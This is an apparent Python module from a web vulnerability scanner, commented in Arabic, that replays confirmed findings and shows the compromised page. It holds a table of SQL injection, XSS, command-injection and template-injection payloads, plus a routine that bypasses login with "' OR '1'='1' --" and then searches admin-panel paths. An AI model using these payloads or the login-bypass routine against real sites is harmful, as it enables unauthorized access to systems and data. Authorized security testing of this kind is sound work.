"""
local-lab/engine/postex.py — ما بعد الاختراق المرئي.
====================================================
لا مزيد من العمل خلف الشاشة: لكل ثغرة مؤكدة نعيد تشغيل دليلها
حيًا عبر نفس الجلسة ونعرض الصفحة المخترَقة (لوحة تحكم/ملف/انعكاس)
كنص مقروء + روابط + كوكيز — ليتخذ المشغّل قراره بعينيه.

كل إعادة تشغيل تمر عبر Session المقيدة بالنطاق (لا خروج أبدًا)،
والعميق منها لا يعمل إلا بتصريح مالك مسجل (يتحقق منه المتصل).
"""
import html as _html
import re
import urllib.parse

try:
    from ..scanner.local_scan import fetch_no_follow
except ImportError:
    try:
        from local_scan import fetch_no_follow
    except ImportError:
        fetch_no_follow = None


# ---------------------------------------------------------- تنقيح العرض
_WS = re.compile(r"[ \t\xa0]+")


def render_text(html_text: str, limit: int = 6000) -> str:
    """يستخرج النص المرئي من HTML (بلا سكربتات/أنماط/وسوم)."""
    t = html_text or ""
    t = re.sub(r"(?is)<(script|style|noscript|head)[^>]*>.*?</\1\s*>",
               " ", t)
    t = re.sub(r"(?i)</?(h[1-6]|p|div|li|tr|section|article|header|footer|"
               r"form|table|ul|ol|blockquote|title)[^>]*>", "\n", t)
    t = re.sub(r"(?i)<br\s*/?>", "\n", t)
    t = re.sub(r"<[^>]+>", " ", t)
    t = _html.unescape(t)
    lines = [_WS.sub(" ", ln).strip() for ln in t.splitlines()]
    out = []
    for ln in lines:
        if ln and (not out or out[-1] != ln):
            out.append(ln)
    return "\n".join(out)[:limit]


def extract_links(html_text: str, base: str, limit: int = 30) -> list:
    """روابط الصفحة (نص + رابط مطلق) للتنقل داخل العارض."""
    out, seen = [], set()
    for m in re.finditer(
            r'<a\s[^>]*href=["\']([^"\']+)["\'][^>]*>(.*?)</a>',
            html_text or "", re.IGNORECASE | re.DOTALL):
        href, label = m.group(1).strip(), render_text(m.group(2))[:60]
        if href.startswith(("javascript:", "mailto:", "tel:", "#", "data:")):
            continue
        absu = urllib.parse.urljoin(base.rstrip("/") + "/", href)
        if absu not in seen:
            seen.add(absu)
            out.append({"text": label or href, "url": absu})
        if len(out) >= limit:
            break
    return out


def fetch_page(session, url: str, timeout: int = 8) -> dict:
    """يجلب صفحة عبر الجلسة ويعيدها معروضة + خامًا للروابط."""
    try:
        st, hdrs, raw = session.get(url, timeout=timeout)
    except Exception as e:
        return {"url": url, "status": 0, "headers": {},
                "text": f"تعذّر الجلب: {e}", "links": [],
                "cookies": [c[0] for c in session.cookies()]}
    try:
        body = raw.decode("utf-8", "replace")
    except Exception:
        body = ""
    raw_b = bytes(raw) if isinstance(raw, (bytes, bytearray)) else b""
    is_bin = raw_b[:4] not in (b"<htm", b"<!DO", b'{"', b"<!xm") and \
        (raw_b[:2] == b"\x89P" or b"\x00" in raw_b[:100])
    return {"url": url, "status": st,
            "headers": {k.lower(): v for k, v in (hdrs or [])},
            "text": "(ملف ثنائي — يعرض كصورة أعلاه)" if is_bin
            else render_text(body),
            "raw": raw_b,
            "links": [] if is_bin else extract_links(body, url),
            "cookies": [c[0] for c in session.cookies()]}


# ---------------------------------------------------------- إعادة التشغيل
_PATH_PARAM = re.compile(r"(/[A-Za-z0-9_.\-/%]+)(\?([A-Za-z0-9_]+))?")
_FILE_PATH = re.compile(r"((?:/[\w\-.]+){1,4}/gx9probe_[\w.]+\.txt)")

_PARAM_PAYLOAD = {
    "G-XSSPARAM": "<gx9qz7t>",
    "G-SQLIERR": "gx9'",
    "G-OPENREDIR": "https://example.com/gx9",
    "XSSREFLECT": "<b>replay9</b>",
    "XSSATTR": '" autofocus onfocus=REPLAY9 x="',
    "XSSPOLY": '\'"`><svg/onload=REPLAY9()>',
    "XSSJS": "';REPLAY9//",
    "D-CMDI": "127.0.0.1; echo GX9VIEW",
    "D-SSTI": "GX{{7*7}}QZ",
    "D-BLIND": "5' AND '1'='2",
    "SQLSEARCH": "' OR '1'='1' --",
    "SQLBLIND": "' AND '1'='2",
}

_ADMIN_CANDIDATES = ["/dashboard", "/admin", "/admin/", "/wp-admin/",
                     "/administrator/", "/panel/", "/backend/", "/console/"]


def _with_param(url: str, param: str, value: str) -> str:
    parts = list(urllib.parse.urlsplit(url))
    q = urllib.parse.parse_qsl(parts[3], keep_blank_values=True)
    q = [(k, value if k == param else v) for k, v in q]
    if not any(k == param for k, _ in q):
        q.append((param, value))
    parts[3] = urllib.parse.urlencode(q)
    return urllib.parse.urlunsplit(parts)


def _param_from_note(row: dict):
    m = _PATH_PARAM.search((row.get("note") or "") +
                           " " + (row.get("evidence") or ""))
    if not m:
        return None, None
    return m.group(1), m.group(3)


def _replay_param(session, base, row, no_follow=False):
    path, param = _param_from_note(row)
    payload = _PARAM_PAYLOAD.get(row.get("code", ""), "gx9view")
    if not path:
        return fetch_page(session, base)
    url = _with_param(urllib.parse.urljoin(base, path.lstrip("/")),
                      param or "q", payload)
    if no_follow and fetch_no_follow is not None:
        try:
            st, hdrs, raw = fetch_no_follow(session, url)
        except Exception as e:
            return {"url": url, "status": 0, "headers": {},
                    "text": f"تعذّر: {e}", "links": [],
                    "cookies": [c[0] for c in session.cookies()]}
        body = raw.decode("utf-8", "replace") if raw else ""
        loc = next((v for k, v in hdrs if k.lower() == "location"), "")
        text = render_text(body)
        if loc:
            text = f"➡ التوجيه إلى: {loc}\n\n{text}"
        return {"url": url, "status": st,
                "headers": {k.lower(): v for k, v in hdrs},
                "text": text or f"(جسم فارغ — الموقع: {loc})",
                "links": extract_links(body, url),
                "cookies": [c[0] for c in session.cookies()]}
    return fetch_page(session, url)


def _replay_login(session, base, row):
    """تجاوز دخول ثم مطاردة لوحة الإدارة — أقوى ما في الموقع بعينيك."""
    ctx = getattr(session, "_generic_ctx", None) or {}
    payload = "' OR '1'='1' --"
    forms = ctx.get("login_forms") or [{"action": base.rstrip("/") + "/login",
                                        "user_field": "username"}]
    target = None
    for f in forms[:2]:
        act = f["action"]
        uf = f.get("user_field", "username")
        try:
            session.post(act, fields={uf: payload, "password": "x"},
                         timeout=8)
        except Exception:
            continue
        target = act
        break
    cands = []
    for p in (ctx.get("probed") or []):
        if any(k in p.lower() for k in ("admin", "dashboard", "panel",
                                        "console")):
            cands.append(p)
    cands += [base.rstrip("/") + c for c in _ADMIN_CANDIDATES]
    best = None
    for u in cands:
        try:
            page = fetch_page(session, u)
        except Exception:
            continue
        if page["status"] != 200:
            continue
        score = len(page["text"])
        if re.search(r"لوحة|تحكم|admin|dashboard|welcome|مرحب",
                     page["text"], re.IGNORECASE):
            score += 5000
        if best is None or score > best[0]:
            best = (score, page)
        if score > 5000:
            break
    if best:
        best[1]["via"] = f"تجاوز عبر {target or '?'}"
        return best[1]
    return fetch_page(session, base)


def _replay_upload(session, base, row):
    m = _FILE_PATH.search((row.get("note") or "") +
                          " " + (row.get("evidence") or ""))
    if m:
        page = fetch_page(
            session, urllib.parse.urljoin(base, m.group(1).lstrip("/")))
        page["via"] = "الملف المرفوع بالكناري"
        return page
    return fetch_page(session, base)


def _replay_get_path(session, base, row):
    m = re.search(r"(/[A-Za-z0-9_.\-/%?=&]+)", (row.get("evidence") or "") +
                  " " + (row.get("note") or ""))
    if m:
        return fetch_page(session, urllib.parse.urljoin(
            base, m.group(1).lstrip("/")))
    return fetch_page(session, base)


_REPLAY = {
    "SQLLOGIN": _replay_login, "D-AUTHBYPASS": _replay_login,
    "UPLOAD": _replay_upload, "D-UPLOAD": _replay_upload,
    "IDOR": _replay_get_path, "PATH": _replay_get_path,
    "SSRF": _replay_get_path, "APIAUTH": _replay_get_path,
    "XSSSTORED": _replay_get_path, "CSRF": _replay_get_path,
}


def replay(session, base: str, row: dict) -> dict:
    """يعيد تشغيل دليل الصف ويعيد صفحة معروضة. لا يخرج عن النطاق أبدًا."""
    code = (row or {}).get("code", "")
    if code in _REPLAY:
        try:
            return _REPLAY[code](session, base, row)
        except Exception as e:
            return {"url": base, "status": 0, "headers": {},
                    "text": f"تعذّر العرض: {e}", "links": [],
                    "cookies": []}
    if code in _PARAM_PAYLOAD:
        try:
            return _replay_param(session, base, row,
                                 no_follow=(code == "G-OPENREDIR"))
        except Exception as e:
            return {"url": base, "status": 0, "headers": {},
                    "text": f"تعذّر العرض: {e}", "links": [],
                    "cookies": []}
    return fetch_page(session, base)
